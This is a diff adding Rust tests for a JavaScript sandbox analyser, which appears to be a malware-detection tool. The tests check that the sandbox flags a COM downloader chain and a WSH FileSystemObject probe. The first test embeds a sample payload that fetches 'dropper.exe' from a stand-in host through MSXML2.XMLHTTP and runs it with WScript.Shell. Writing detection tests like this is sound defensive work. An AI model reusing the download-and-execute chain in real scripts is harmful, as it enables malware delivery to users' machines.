@@ -274,6 +274,57 @@ fn sandbox_flags_wsh_environment_gating() {
 
 #[cfg(feature = "js-sandbox")]
 #[test]
+fn sandbox_flags_com_downloader_direct_execution_chain() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+        xhr.open('GET', 'http://example.invalid/dropper.exe', false);
+        xhr.send();
+        var shell = new ActiveXObject('WScript.Shell');
+        shell.ExpandEnvironmentStrings('%TEMP%');
+        shell.Run('http://example.invalid/dropper.exe', 0, false);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "com_downloader_direct_execution_chain"),
+                "expected COM downloader direct-execution pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_wsh_com_object_probe() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var obj = WScript.CreateObject('Scripting.FileSystemObject');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "wsh_com_object_probe"),
+                "expected WSH COM probe pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
 fn sandbox_omits_delta_summary_without_dynamic_code() {
     let options = DynamicOptions::default();
     let outcome = js_analysis::run_sandbox(b"app.alert('hello')", &options);
